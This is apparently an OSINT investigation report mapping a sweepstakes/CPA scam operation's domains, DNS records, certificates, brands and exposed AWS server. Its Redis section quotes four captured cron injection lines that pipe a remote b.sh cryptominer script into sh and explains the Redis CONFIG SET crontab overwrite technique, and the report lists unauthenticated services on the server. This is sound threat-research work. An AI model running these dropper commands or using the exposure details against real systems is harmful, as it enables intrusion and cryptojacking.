# The Complete Scam Flow

A comprehensive map of every domain, subdomain, DNS record, service, page, and connection in the epicfunnels.net / Moxxi Media CPA scam operation.

## The Operator: Moxxi Media

```mermaid
flowchart TD
    subgraph MOXXI["MOXXI MEDIA"]
        TENANT["moxximedia.onmicrosoft.com\nMicrosoft 365 Tenant\nDKIM selectors route here"]
        NO_DOMAIN["moxximedia.com\nNOT REGISTERED\nThey only exist as an M365 tenant"]
    end

    subgraph M365_VERIFY["M365 VERIFICATION HISTORY"]
        MS_MAP["MS=ms46839871\nmyamericanprizes.com\nStatus: ACTIVE"]
        MS_EPIC["MS=ms66511106\nepicfunnels.net\nStatus: DELETED"]
    end

    subgraph BACKEND["BACKEND PLATFORM"]
        CTC["CustomerTestConnect\nExpress.js + Handlebars (.hbs)\nx-powered-by: Express\nError page: 'Oops - CustomerTestConnect'\nTheme: /themes/myamericanprizes/"]
    end

    TENANT --> MS_MAP
    TENANT --> MS_EPIC
    CTC --> MS_MAP

    style NO_DOMAIN fill:#555,color:#aaa,stroke-dasharray: 5 5
    style MS_EPIC fill:#c92127,color:#fff
    style MS_MAP fill:#5aba47,color:#fff
    style TENANT fill:#0078d4,color:#fff
```

## The Victim Journey

```mermaid
flowchart TD
    subgraph TIKTOK["TIKTOK / SOCIAL MEDIA"]
        TT["Victim sees TikTok\n'Jessica said I could win!'"]
    end

    subgraph CLOUDFLARE_PROXY["CLOUDFLARE PROXY LAYER"]
        CF_CHERYL["cheryl.ns.cloudflare.com\nlogan.ns.cloudflare.com"]
        CF_CASS["cass.ns.cloudflare.com\nfelicity.ns.cloudflare.com"]
        CF_IP1["104.21.11.211"]
        CF_IP2["172.67.192.166"]
    end

    subgraph SCAM_PAGE["SCAM PAGE -- jessica.epicfunnels.net"]
        LANDING["'You've been selected to win\nan iPhone 17 Pro Max!'\n\nCountdown timer\nFake 'Recent Winners' (8 Unsplash stock photos)\nToast notifications via Sonner\n'Sarah just claimed a spot!'"]
        COLORS["Pick Your Color!\n- Cosmic Orange (558KB WebP)\n- Deep Blue (477KB WebP)\n- Silver (394KB WebP)"]
        CTA["'Confirm -> Answer Survey -> Claim Prize'"]
        BEACON["navigator.sendBeacon\n('/api/continue-click')"]
        REDIRECT["window.location.href =\n'/api/continue'"]
    end

    subgraph TRACKER["CPA AFFILIATE TRACKER"]
        PHEF["phef6trk.com\n/FGK5P4/2Z57CD5/"]
        SINKHOLE["10.0.0.1\nSINKHOLED\nNS records: EMPTY\nWhois: SCRUBBED"]
    end

    TT -->|"link to jessica.epicfunnels.net"| CF_CHERYL
    CF_CHERYL --> CF_IP1 & CF_IP2
    CF_IP1 --> LANDING
    CF_IP2 --> LANDING
    LANDING --> COLORS --> CTA
    CTA --> BEACON --> REDIRECT
    REDIRECT -->|"HTTP 302"| PHEF
    PHEF -->|"DNS resolves to"| SINKHOLE

    style SINKHOLE fill:#c92127,color:#fff,stroke:#c92127
    style PHEF fill:#ffcc33,color:#000,stroke:#ffcc33
    style LANDING fill:#1a1a2e,color:#fff
    style TIKTOK fill:#000,color:#fff
```

## WHOIS Timeline

All domains in chronological order of registration.

```mermaid
gantt
    title Domain Registration Timeline
    dateFormat YYYY-MM-DD
    axisFormat %Y-%m

    section Active
    myamericanprizes.com (GoDaddy)       :active, map, 2023-08-22, 2026-08-22
    phef6trk.com (Squarespace, DNSSEC)   :active, trk, 2024-06-25, 2026-06-25
    noodledit.com (Cloudflare)            :active, noo, 2024-10-18, 2026-10-18
    mydailysurge.com (Cloudflare, 2yr!)   :active, mds, 2025-03-19, 2027-03-19
    epicfunnels.net (Sav.com)             :active, epi, 2025-08-26, 2026-08-26

    section Expired
    olivimails.com (EXPIRED)              :done, oli, 2025-08-01, 2026-03-01
```

| Domain | Registrar | Created | Expires | Notes |
|--------|-----------|---------|---------|-------|
| myamericanprizes.com | GoDaddy | 2023-08-22 | 2026-08-22 | THE OG -- oldest domain, 2.5 years old |
| phef6trk.com | Squarespace | 2024-06-25 | 2026-06-25 | DNSSEC signed, Google Cloud DNS, SINKHOLED |
| noodledit.com | Cloudflare | 2024-10-18 | 2026-10-18 | Asset CDN, cert renewed 2026-04-04 |
| mydailysurge.com | Cloudflare | 2025-03-19 | 2027-03-19 | Renewed for 2 YEARS -- they're invested |
| epicfunnels.net | Sav.com | 2025-08-26 | 2026-08-26 | Lovable AI scam funnels |
| olivimails.com | -- | -- | EXPIRED | WHOIS returns "No match", domain gone |

## The Full Infrastructure

```mermaid
flowchart TD
    subgraph DOMAINS["ALL 6 DOMAINS + 1 EXPIRED"]
        direction LR
        D_MAP["myamericanprizes.com\nRegistrar: GoDaddy\nRegistered: 2023-08-22\nCF NS: cass/felicity\nTHE OG DOMAIN"]
        D_EPIC["epicfunnels.net\nRegistrar: Sav.com\nRegistered: 2025-08-26\nCF NS: cheryl/logan"]
        D_NOODLE["noodledit.com\nRegistrar: Cloudflare\nRegistered: 2024-10-18\nCF NS: cass/felicity"]
        D_SURGE["mydailysurge.com\nRegistrar: Cloudflare\nRegistered: 2025-03-19\nCF NS: cass/felicity"]
        D_TRACKER["phef6trk.com\nRegistrar: Squarespace\nRegistered: 2024-06-25\nDNSSEC signed\nGoogle Cloud DNS\nSINKHOLED"]
        D_OLIVI["olivimails.com\nEXPIRED\nWHOIS: No match\nEC2 still uses hostname\nZero CT log entries"]
    end

    subgraph SHARED_CF["SHARED CLOUDFLARE ACCOUNTS"]
        CF1["Account 1\ncheryl/logan"]
        CF2["Account 2\ncass/felicity"]
    end

    D_EPIC --- CF1
    D_NOODLE --- CF2
    D_SURGE --- CF2
    D_MAP --- CF2

    style D_TRACKER fill:#c92127,color:#fff
    style D_OLIVI fill:#555,color:#fff,stroke-dasharray: 5 5
    style D_MAP fill:#5aba47,color:#fff,stroke-width:3px
    style CF2 fill:#f96,color:#000
```

## myamericanprizes.com -- The OG Domain

```mermaid
flowchart TD
    subgraph MAP_INFRA["myamericanprizes.com (LIVE)"]
        MAP_ROOT["myamericanprizes.com\nOldest domain: 2023-08-22\nGoDaddy registration\nx-powered-by: Express\nCustomerTestConnect backend"]
        MAP_WILD["*.myamericanprizes.com\nWildcard SSL\nGoogle Trust Services WE1"]
        MAP_THEME["Theme: /themes/myamericanprizes/\nHandlebars templates (.hbs files)"]
    end

    subgraph MAP_DNS["DNS RECORDS"]
        MAP_MX["MX: myamericanprizes-com\n.mail.protection.outlook.com\n(M365 Exchange)"]
        MAP_SPF["SPF: v=spf1\ninclude:spf.protection.outlook.com -all"]
        MAP_DMARC["DMARC: v=DMARC1; p=none\nrua=mailto:ed520975d128...@\ndmarc-reports.cloudflare.net"]
        MAP_DKIM["DKIM: selector1/selector2\n-> moxximedia.onmicrosoft.com"]
        MAP_MS["TXT: MS=ms46839871\n(M365 verified, ACTIVE)"]
        MAP_AP["TXT: activeprospect-domain-verification=\nDdrUnuCT8xESAT7uOdJmqg=="]
        MAP_APPLE["TXT: apple-domain-verification=\nySS9fHR4xXuFRiE0"]
        MAP_AUTO["Autodiscover CNAME\n-> autodiscover.outlook.com"]
    end

    subgraph MAP_CF["CLOUDFLARE"]
        MAP_NS["NS: cass/felicity\nSame account as noodledit.com\nand mydailysurge.com"]
    end

    MAP_ROOT --> MAP_WILD
    MAP_ROOT --> MAP_THEME
    MAP_NS --> MAP_ROOT
    MAP_MX --> MAP_DKIM

    style MAP_ROOT fill:#5aba47,color:#fff,stroke-width:3px
    style MAP_DKIM fill:#0078d4,color:#fff
    style MAP_MS fill:#0078d4,color:#fff
```

## epicfunnels.net -- Subdomains & DNS

```mermaid
flowchart TD
    subgraph EPIC_SUBS["epicfunnels.net SUBDOMAINS"]
        direction TB

        subgraph LIVE_SUBS["LIVE"]
            JESSICA["jessica.epicfunnels.net\nA: 104.21.11.211\nStatus: LIVE\nScam funnel page"]
            WWW["www.epicfunnels.net\nA: 172.67.192.166\nStatus: LIVE (new)\nSame scam page as jessica"]
            WEBMAIL["webmail.epicfunnels.net\nA: 172.67.192.166\nRoundcube 1.6.11"]
            ROOT["epicfunnels.net\nA: 104.21.11.211, 172.67.192.166\nNow serving scam page too"]
        end

        subgraph DEAD_SUBS["NXDOMAIN / REMOVED"]
            JENNY["jenny.epicfunnels.net\nRemoved 2026-04-09\nCT first seen: 2026-02-17"]
            KYLIE["kylie.epicfunnels.net\nRemoved 2026-04-09\nCT first seen: 2025-12-14"]
            AFILIADOS["afiliados.epicfunnels.net\nSpanish: 'affiliates'"]
            SOCIO["socio.epicfunnels.net\nSpanish: 'partner'"]
            SOCIOS["socios.epicfunnels.net\nSpanish: 'partners'"]
            EVENTO["evento.epicfunnels.net\nSpanish: 'event'"]
            APP["app.epicfunnels.net\nCT first seen: 2023-06-16"]
            DEMO["demo.epicfunnels.net"]
            LINK["link.epicfunnels.net\nCT first seen: 2023-10-13"]
            MOBILE["m.epicfunnels.net"]
            VPN["vpn.epicfunnels.net"]
        end
    end

    subgraph EPIC_DNS["epicfunnels.net DNS RECORDS"]
        MX["MX 10\n_dc-mx.16d4f49190c7.epicfunnels.net\n-> 13.220.193.170"]
        SPF1["SPF #1\nv=spf1 a mx ip4:13.220.193.170 -all"]
        SPF2["SPF #2 (CONFLICTING!)\nv=spf1 include:spf.protection.outlook.com\ninclude:mail.zendesk.com -all"]
        DMARC["DMARC\nv=DMARC1; p=quarantine; pct=100"]
        DKIM["DKIM\nmail._domainkey.epicfunnels.net\nv=DKIM1; k=rsa;\np=DKIM-SUPPORT-IS-NOT-ACTIVATED\n(placeholder -- never completed)"]
        GOOGLE_V["TXT: google-site-verification=\nqWPTL9H_t4lE4Lja7ZwdNCdmGBQEaTmtJiX7KpXbkxM"]
        MS_V["TXT: MS=ms66511106\n(Microsoft 365 -- DELETED tenant)"]
        AP_V["TXT: activeprospect-domain-verification=\nM+mUYgTDEprxDUAdcdobLA==\n(TCPA consent / lead gen)"]
        ACME1["_acme-challenge.jessica"]
        ACME2["_acme-challenge.jenny"]
        ACME3["_acme-challenge.kylie"]
        ACME4["_acme-challenge.epicfunnels.net"]
    end

    style DEAD_SUBS fill:#2a1a1a,color:#ff6666
    style LIVE_SUBS fill:#1a2a1a,color:#66ff66
    style SPF2 fill:#c92127,color:#fff
    style DKIM fill:#ffcc33,color:#000
    style MS_V fill:#c92127,color:#fff
```

## mydailysurge.com -- The SEO Content Farm

```mermaid
flowchart TD
    subgraph SURGE_SUBS["mydailysurge.com SUBDOMAINS"]
        SURGE_ROOT["mydailysurge.com\nA: 34.36.210.5 (Google Cloud)\nStatus: 404"]
        EXPLORE["explore.mydailysurge.com\nA: 104.21.71.114 (Cloudflare)\nSeparate cert (Google Trust WE1)\nStatus: LIVE\nWebflow blog"]
        SIGNUP["signup.mydailysurge.com\nA: 34.36.210.5\nStatus: 404"]
        TRCK["trck.mydailysurge.com\nA: 34.36.210.5\nStatus: 404"]
        DAILY["1.mydailysurge.com through\n31.mydailysurge.com\nA: 34.36.210.5\nAll 404\n(daily rotating landing pages)"]
    end

    subgraph SURGE_SSL["SSL: 35 SANs"]
        CERT_SURGE["mydailysurge.com cert\nSANs: mydailysurge.com + www\n+ signup + trck\n+ 1 through 31\n= 35 total Subject Alt Names\n(daily rotation infrastructure)"]
    end

    subgraph WEBFLOW["WEBFLOW SEO BLOG"]
        WF_SITE["Site ID: 68129c0789b42b5281896601\nCSS: staging-mydailysurge-v1\nLast modified: Apr 5, 2026"]
        WF_GA["Google Analytics: G-BSTM4RV28F\nGoogle Tag Manager: GTM-N3JVLCTN"]
        WF_CONTENT["Categories:\nPersonal Finance | Travel\nHome Design | Wellness\nStock photos: Pexels"]
    end

    EXPLORE --> WF_SITE --> WF_GA
    WF_SITE --> WF_CONTENT

    style SURGE_ROOT fill:#c92127,color:#fff
    style SIGNUP fill:#c92127,color:#fff
    style TRCK fill:#c92127,color:#fff
    style DAILY fill:#c92127,color:#fff
    style EXPLORE fill:#5aba47,color:#fff
    style CERT_SURGE fill:#ffcc33,color:#000
```

## noodledit.com -- Asset CDN / GCS Bucket Factory

```mermaid
flowchart TD
    subgraph NOODLE["noodledit.com (CF: cass/felicity)"]
        NOODLE_ROOT["noodledit.com\nRoot: empty response\nCert renewed: 2026-04-04"]
        B_SUB["b.noodledit.com\nA: 104.21.50.252 / 172.67.215.119\n747 objects, 122.4 MB\nPublicly listable"]
        S_SUB["sassets.noodledit.com\nA: 104.21.50.252 / 172.67.215.119\n28 objects\nPublicly listable"]
    end

    subgraph GCS["GOOGLE CLOUD STORAGE INVENTORY"]
        GCS_STATS["b.noodledit.com bucket\n747 objects | 122.4 MB\nDate range: 2024-10-22 to 2026-04-08\nMost recent: creditcard.png (Apr 8)\nOPG Housing.jpg (Apr 6)\nACTIVE TODAY"]
        SASSETS_STATS["sassets.noodledit.com bucket\n28 objects\nBrand logos and page assets"]
    end

    subgraph PROMO_CATS["PROMOTION CATEGORIES IN BUCKET"]
        GIFT["Gift Cards\nAmazon $500/$1000\nWalmart $750/$1000\nKroger $1000 | Target\nDollar Tree $1000\nChipotle | Chick-fil-A $750\nPublix $750 | Casey's $750\nRed Lobster $1000\nOutback $1000 | McDonald's\nStarbucks $500 | Macy's\nShein | Speedway $750"]
        VEHICLES["Vehicles\nGMC Canyon | Ford Maverick\nNissan Frontier\nChevy Colorado\nToyota RAV4 | Corvette\nHonda/Indian Scout/\nKawasaki motorcycles"]
        LUXURY["Luxury\nCeline purse | Hermes purse\nE.l.f. cosmetics\nPerfume set | Ticketmaster\nBedding set $1000"]
        GAS["Gas Stations\nBP $750 | Shell $750\nExxon $750 | Speedway $750"]
        ELECTRONICS["Electronics\niPhone 17 Pro Max | MacBook\nPS5 | Samsung | Nintendo\nJBL PartyBox 310 | DeWalt\nE-Bike"]
        TRAVEL["Travel\nNorwegian cruise\nPrincess Cruises"]
        MEDICAL["Medical\nHealth plan\nMedical benefits bundles"]
        FINANCIAL["Financial\nCash App | Gold bar $1000\nCredit card\nMystery gift cards"]
    end

    B_SUB --> GCS_STATS
    S_SUB --> SASSETS_STATS

    style GCS fill:#4285f4,color:#fff
    style GCS_STATS fill:#4285f4,color:#fff
    style GIFT fill:#1a1a2e,color:#fff
    style VEHICLES fill:#1a1a2e,color:#fff
```

## Government Benefits Scams

A separate category of promotions targeting vulnerable people searching for government assistance.

```mermaid
flowchart TD
    subgraph GOV_SCAMS["GOVERNMENT BENEFITS SCAM PROMOTIONS"]
        direction LR
        FOOD["Food stamps"]
        INFLATION["Inflation relief"]
        STIMULUS["Stimulus payments"]
        UNEMPLOYMENT["Unemployment benefits"]
        RENTAL["Rental assistance"]
        STUDENT["Student aid"]
        STARTUP["Startup grants"]
        SENIOR["Senior benefits"]
        CHILD["Child/family assistance"]
        TARIFF["Tariff relief"]
        UNCLAIMED["Unclaimed money"]
    end

    subgraph BRANDS_GOV["BRANDS USED"]
        HPS["HealthPlanScouts"]
        FHP["Fresh Health Plan"]
        BAC["BenefitsAccessCenter"]
    end

    BRANDS_GOV --> GOV_SCAMS

    style GOV_SCAMS fill:#c92127,color:#fff
    style FOOD fill:#c92127,color:#fff
    style INFLATION fill:#c92127,color:#fff
    style STIMULUS fill:#c92127,color:#fff
    style UNEMPLOYMENT fill:#c92127,color:#fff
    style RENTAL fill:#c92127,color:#fff
    style STUDENT fill:#c92127,color:#fff
    style STARTUP fill:#c92127,color:#fff
    style SENIOR fill:#c92127,color:#fff
    style CHILD fill:#c92127,color:#fff
    style TARIFF fill:#c92127,color:#fff
    style UNCLAIMED fill:#c92127,color:#fff
```

## The EC2 Server -- Every Open Port

```mermaid
flowchart TD
    subgraph MGMT["MANAGEMENT LAYER"]
        HESTIA["Hestia Control Panel v1.9.4\n:8083 HTTPS\nCert CN: fqdn.olivimails.com\nCert Org: Hestia Control Panel\nLocation: San Francisco, CA\nCert created: Aug 28, 2025\nTLS 1.3\nCookie: HESTIASID (HttpOnly, Secure, SameSite=Strict)\n/list/* -> 302 (requires login)\n/fm/ -> 500 (broken)\n/api/ -> 405\n\nEXPOSED TO THE ENTIRE INTERNET"]
    end

    subgraph EC2["AWS EC2 -- 13.220.193.170\nus-east-1\nReverse DNS: ec2-13-220-193-170.compute-1.amazonaws.com\nInternal hostname: ip-172-26-15-175.ec2.internal\nOS: Debian Bookworm (6.1.0-42-cloud-amd64)\n11 OPEN PORTS"]
        SSH[":22 SSH\nOpenSSH 9.2p1"]
        HTTP[":80 HTTP\nnginx 'Success!' page\n9 virtual hosts"]
        HTTPS[":443 HTTPS\nCert EXPIRED Jan 25, 2026\nRedirects to HTTP"]
        IMAP[":143 IMAP\nDovecot"]
        SMTPS[":465 SMTPS\nOpen"]
        SMTP_SUB[":587 SMTP Submission\nHostname: ip-172-26-15-175.ec2.internal\nSTARTTLS, 50MB max\nPIPELINING, CHUNKING"]
        SMTP_25[":25 SMTP\nBLOCKED by AWS"]
        IMAPS[":993 IMAPS\nDovecot\nAUTH=PLAIN AUTH=LOGIN\nBanner: 'Mail Delivery Agent'\nCert: fqdn.olivimails.com"]
        NODE[":3000 Node.js\nHTTP 500 on ALL endpoints\n/health /status /api\n/api/continue /api/continue-click\n/.env /package.json\nCOMPLETELY DEAD"]
        PG[":5432 PostgreSQL\nEXPOSED TO INTERNET\nClick tracking / analytics"]
        REDIS[":6379 Redis 7.4.7\nrequirepass: EMPTY\nprotected-mode: NO\nbind: * (all interfaces)\nUptime: 75 days\nRunning as PID 1 in Docker\n4 keys in db0 (MALWARE)\n500 cached Lua scripts\n2.56MB used / 3.78GB system\nCOMPLETELY OPEN\nCONFIG: dir=/data\ndbfilename=dump.rdb"]
    end

    subgraph VHOSTS["NGINX VIRTUAL HOSTS ON :80"]
        VH1["olivimails.com -> 'Success!' (2520B)"]
        VH2["fqdn.olivimails.com -> 'Coming Soon' (2499B)"]
        VH3["epicfunnels.net -> different content (472B)"]
        VH4["jessica.epicfunnels.net -> 'Success!' (2520B)"]
        VH5["noodledit.com -> 'Success!' (2520B)"]
        VH6["mydailysurge.com -> 'Success!' (2520B)"]
        VH7["phef6trk.com -> 'Success!' (2520B)"]
        VH8["webmail.epicfunnels.net -> Roundcube"]
        VH9["mail.epicfunnels.net -> Roundcube"]
    end

    HESTIA --> EC2
    HTTP --> VHOSTS

    style HESTIA fill:#c92127,color:#fff,stroke-width:3px
    style REDIS fill:#c92127,color:#fff,stroke-width:3px
    style PG fill:#c92127,color:#fff
    style NODE fill:#555,color:#aaa
    style HTTPS fill:#ffcc33,color:#000
    style SMTP_25 fill:#555,color:#aaa
```

## Redis Malware -- Cryptojacking Attempt

The 4 Redis keys are crontab injection payloads from an automated botnet scanner. The attack vector: write crontab entries to Redis, then use `CONFIG SET dir/dbfilename` to overwrite the host's `/var/spool/cron/root`.

```mermaid
flowchart TD
    subgraph REDIS_KEYS["REDIS db0 -- 4 KEYS"]
        K1["backup1\n*/2 * * * * root cd1 -fsSL\nhttp://oracle.zzhreceive.top/b2f628/b.sh | sh"]
        K2["backup2\n*/3 * * * * root wget -q -O-\nhttp://oracle.zzhreceive.top/b2f628/b.sh | sh"]
        K3["backup3\n*/4 * * * * root curl -fsSL\nhttp://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh"]
        K4["backup4\n*/5 * * * * root wd1 -q -O-\nhttp://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh"]
    end

    subgraph C2["C2 SERVER"]
        C2_DOMAIN["oracle.zzhreceive.top\nDNS: DEAD\nDomain: EXPIRED .top\nPayload: b.sh (cryptominer)"]
    end

    subgraph DOCKER["WHY THE ATTACK FAILED"]
        DOCKER_WALL["Redis runs in Docker container\nPID 1 = redis-server\nCONFIG dir=/data (Docker default)\nCONFIG dbfilename=dump.rdb\nContainer has no cron daemon\nNo access to host filesystem\n\nCrontab injection writes to\n/data/dump.rdb inside container\n= HARMLESS"]
    end

    subgraph PROOF["WHAT THIS PROVES"]
        BOTNET["Automated botnet scanners\nfound this open Redis\nwithin days of deployment\n\nThe scam operators left\nan unauthenticated Redis\non the public internet\nand got owned by bots"]
    end

    K1 & K2 & K3 & K4 --> C2_DOMAIN
    C2_DOMAIN -->|"DEAD"| DOCKER_WALL

    style C2_DOMAIN fill:#c92127,color:#fff
    style DOCKER_WALL fill:#555,color:#fff
    style K1 fill:#ffcc33,color:#000
    style K2 fill:#ffcc33,color:#000
    style K3 fill:#ffcc33,color:#000
    style K4 fill:#ffcc33,color:#000
```

## Email Infrastructure

```mermaid
flowchart TD
    subgraph EMAIL["EMAIL STACK"]
        RC["Roundcube 1.6.11\nwebmail.epicfunnels.net\nInstalled: Aug 16, 2025\nsession_lifetime: 600s\ncookie_secure: FALSE\nCSRF token: per-session"]
        RC_PATHS["Exposed paths (403 -> 301):\n/CHANGELOG.md\n/SQL/\n/config/\n/logs/\n/installer/\n/INSTALL\n/README.md"]
        DOVE["Dovecot\n:143 IMAP\n:993 IMAPS\nAUTH=PLAIN AUTH=LOGIN"]
        EXIM[":587 SMTP Submission\nHostname: ip-172-26-15-175.ec2.internal\nSTARTTLS, 50MB max\nPIPELINING, CHUNKING\n:465 SMTPS also open"]
    end

    subgraph EMAIL_MAP["myamericanprizes.com EMAIL (M365)"]
        MAP_MX2["MX: myamericanprizes-com\n.mail.protection.outlook.com"]
        MAP_SPF2["SPF: include:spf.protection.outlook.com -all"]
        MAP_DMARC2["DMARC: p=none\nCloudflare DMARC reporting"]
        MAP_DKIM2["DKIM: selector1/selector2\n-> moxximedia.onmicrosoft.com"]
    end

    subgraph EMAIL_EPIC["epicfunnels.net EMAIL (EC2)"]
        MX2["MX 10 _dc-mx.16d4f49190c7.epicfunnels.net"]
        SPF_R["SPF: v=spf1 a mx ip4:13.220.193.170 -all"]
        DMARC2["DMARC: v=DMARC1; p=quarantine; pct=100"]
        DKIM2["DKIM: DKIM-SUPPORT-IS-NOT-ACTIVATED\n(placeholder key)"]
    end

    subgraph CERTS["SSL CERTIFICATES"]
        CERT_LE["Let's Encrypt R13\nepicfunnels.net\nEXPIRED Jan 25, 2026"]
        CERT_CF["Google Trust Services WE1\n*.epicfunnels.net\nValid through May 20, 2026\n(Cloudflare managed)"]
        CERT_MAP["Google Trust Services WE1\n*.myamericanprizes.com\nWildcard cert"]
        CERT_HESTIA["Self-signed\nfqdn.olivimails.com\nO=Hestia Control Panel\nCreated Aug 28, 2025\nUsed on ALL email TLS"]
        CERT_JESSICA["Let's Encrypt E8\njessica.epicfunnels.net\nValid through Apr 18, 2026"]
        CERT_JENNY["Let's Encrypt E7\njenny.epicfunnels.net\nValid through May 18, 2026"]
        CERT_KYLIE["Let's Encrypt E7\nkylie.epicfunnels.net\nValid through Jun 1, 2026"]
        CERT_NOODLE["noodledit.com\nRenewed 2026-04-04\n(4 days before probe)"]
        CERT_SURGE["mydailysurge.com\n35 SANs (daily rotation)"]
        CERT_EXPLORE["explore.mydailysurge.com\nGoogle Trust WE1\nSeparate cert"]
    end

    RC --> DOVE
    RC --> RC_PATHS
    MX2 --> DOVE
    DOVE --> EXIM

    style CERT_LE fill:#c92127,color:#fff
    style DKIM2 fill:#ffcc33,color:#000
    style CERT_HESTIA fill:#555,color:#fff
    style MAP_DKIM2 fill:#0078d4,color:#fff
    style CERT_MAP fill:#5aba47,color:#fff
```

## Third-Party Integrations

```mermaid
flowchart LR
    EPIC["epicfunnels.net"] --> GSC["Google Search Console\ngoogle-site-verification=\nqWPTL9H..."]
    EPIC --> M365_OLD["Microsoft 365\nMS=ms66511106\nSTATUS: DELETED"]
    EPIC --> AP["ActiveProspect\nTCPA consent verification\n(confirms CPA lead gen)"]
    EPIC --> ZD["Zendesk\ninclude:mail.zendesk.com\n(in conflicting SPF #2)"]
    EPIC --> OUTLOOK_OLD["Outlook.com\ninclude:spf.protection.outlook.com\n(in conflicting SPF #2)"]
    EPIC --> LOVABLE["Lovable AI\nVibeScamming score: 1.8/10\nVite + React + Tailwind\nOG image on lovable.dev"]

    MAP["myamericanprizes.com"] --> M365_NEW["Microsoft 365\nMS=ms46839871\nSTATUS: ACTIVE\nMoxxi Media tenant"]
    MAP --> MAP_AP["ActiveProspect\nDdrUnuCT8xESAT7uOdJmqg=="]
    MAP --> APPLE["Apple\nDomain verification:\nySS9fHR4xXuFRiE0"]
    MAP --> MAP_EXCHANGE["M365 Exchange\nFull email routing\nDKIM -> moxximedia.onmicrosoft.com"]
    MAP --> MAP_DMARC_CF["Cloudflare DMARC Reporting\ned520975d128...@\ndmarc-reports.cloudflare.net"]

    SURGE["explore.mydailysurge.com"] --> WEBFLOW2["Webflow\nSite ID: 68129c0789b42b5281896601"]
    SURGE --> GA["Google Analytics\nG-BSTM4RV28F"]
    SURGE --> GTM["Google Tag Manager\nGTM-N3JVLCTN"]

    style LOVABLE fill:#ff69b4,color:#000
    style AP fill:#f96,color:#000
    style MAP_AP fill:#f96,color:#000
    style M365_OLD fill:#c92127,color:#fff
    style M365_NEW fill:#5aba47,color:#fff
```

## Brands -- 15+ and Counting

```mermaid
flowchart TD
    subgraph BRANDS_SCAM["SCAM / SWEEPSTAKES BRANDS"]
        GNG["GetnGoods\nTwitter: @GetnGoods\nMeta author in JS bundle\nUsed on scam pages"]
        MDS["MyDailySurge\nSEO lifestyle blog\nLogo on sassets.noodledit.com\nCategories: Finance, Travel,\nHome Design, Wellness"]
        PZ["PrizeZappy\nSweepstakes brand"]
        SNG["SnagNGoods\nSweepstakes brand"]
        PZR["PrizeZar\nSweepstakes brand"]
        PLZ["PlayZoodle\nSweepstakes brand"]
        TDTJ["TheDailyTipJar\nSweepstakes brand"]
    end

    subgraph BRANDS_GOV["GOVERNMENT BENEFITS BRANDS"]
        HPS["HealthPlanScouts\nHealth plan scams"]
        FHP["Fresh Health Plan\nHealth plan scams"]
        BAC["BenefitsAccessCenter\nGov benefits scams"]
    end

    subgraph BRANDS_FINANCIAL["FINANCIAL / OTHER BRANDS"]
        LEND["LendliV2\nFinancial brand"]
        PRISM["Prismique\nUnknown purpose"]
        CG["CheckGo\nFinancial brand"]
        OPG["OPG Housing\nHousing scam\nMost recent GCS upload:\nApr 6, 2026"]
    end

    subgraph BRANDS_PLATFORM["PLATFORM / OPERATOR"]
        CTC2["CustomerTestConnect\nThe backend platform\nExpress.js + Handlebars\nPowers myamericanprizes.com"]
        MAP2["MyAmericanPrizes\nThe OG brand\nOldest domain (2023-08-22)"]
    end

    GNG --> EPIC3["epicfunnels.net"]
    MDS --> EXPLORE3["explore.mydailysurge.com"]
    MDS --> NOODLE3["sassets.noodledit.com"]
    CTC2 --> MAP3["myamericanprizes.com"]
    MAP2 --> MAP3

    style GNG fill:#1a1a2e,color:#fff
    style MDS fill:#5594cf,color:#fff
    style CTC2 fill:#5aba47,color:#fff
    style BAC fill:#c92127,color:#fff
    style HPS fill:#c92127,color:#fff
    style FHP fill:#c92127,color:#fff
    style OPG fill:#ffcc33,color:#000
```

## The Scam Is Broken

```mermaid
flowchart LR
    VICTIM["Victim clicks\njessica.epicfunnels.net"] --> API1["sendBeacon\n/api/continue-click"]
    VICTIM --> API2["redirect\n/api/continue"]
    API1 -->|"HTTP 302"| TRACKER2["phef6trk.com\n/FGK5P4/2Z57CD5/"]
    API2 -->|"HTTP 302"| TRACKER2
    TRACKER2 -->|"DNS: 10.0.0.1"| NOWHERE["NOWHERE\n\nTracker sinkholed\nNS records deleted\nWhois scrubbed\nFunnel is dead"]
    NODE2[":3000 Node.js\nHTTP 500"] -.->|"was supposed to\nhandle these"| API1
    NODE2 -.-> API2

    style NOWHERE fill:#c92127,color:#fff,stroke-width:4px
    style NODE2 fill:#555,color:#aaa,stroke-dasharray: 5 5
    style TRACKER2 fill:#ffcc33,color:#000
```

## Operator Behavior (Active Despite Being Broken)

| Action | When | Interpretation |
|--------|------|----------------|
| Registered myamericanprizes.com | Aug 22, 2023 | Operation started 2.5 YEARS ago |
| Uploaded creditcard.png to GCS | Apr 8, 2026 | Active TODAY |
| Uploaded OPG Housing.jpg to GCS | Apr 6, 2026 | Active 2 days ago |
| 747 objects in b.noodledit.com | 2024-10-22 to 2026-04-08 | Continuous asset production |
| Renewed mydailysurge.com for 2 years | 2025 | Long-term investment |
| Renewed noodledit.com SSL cert | Apr 4, 2026 | Active maintenance |
| Removed jenny.epicfunnels.net DNS | Apr 8-9, 2026 | Consolidating funnels |
| Removed kylie.epicfunnels.net DNS | Apr 8-9, 2026 | Consolidating funnels |
| Activated www.epicfunnels.net | Apr 8-9, 2026 | New landing strategy |
| Activated epicfunnels.net root | Apr 8-9, 2026 | Serving scam page on root |
| Added Redis on :6379 | ~Jan 24, 2026 | Active development |
| Updated explore.mydailysurge.com | Apr 5, 2026 | Still investing in SEO |
| Moved explore.mydailysurge.com to Cloudflare | Apr 5-8, 2026 | Infrastructure changes |
| myamericanprizes.com fully operational | Current | Express.js backend, M365 email, live |
| Let olivimails.com expire | Recent | Domain not renewed, WHOIS gone |
| Did NOT fix tracker | Still sinkholed | Doesn't know or doesn't care |
| Did NOT renew mail cert on EC2 | Expired Jan 2026 | Abandoned EC2 email operations |
| Did NOT fix Node.js app on EC2 | Still HTTP 500 | EC2 backend is dead |
| Did NOT secure Redis | No auth, got cryptojacked | Botnet found it before they did |
| Did NOT register moxximedia.com | Never registered | Only exists as M365 tenant |

## Stats

- **6** domains (+ 1 expired)
- **21** subdomains (historical) on epicfunnels.net
- **35** SANs on mydailysurge.com cert (daily rotation)
- **15+** brand names across GCS bucket
- **747** objects in b.noodledit.com bucket (122.4 MB)
- **11** open ports on EC2
- **9** nginx virtual hosts
- **10+** SSL certificates tracked
- **4** Redis keys containing cryptominer crontab payloads
- **4** DNS TXT records on epicfunnels.net
- **8** DNS TXT records on myamericanprizes.com
- **3** domains sharing cass/felicity Cloudflare account
- **2** Cloudflare accounts
- **2** M365 tenants (1 active, 1 deleted)
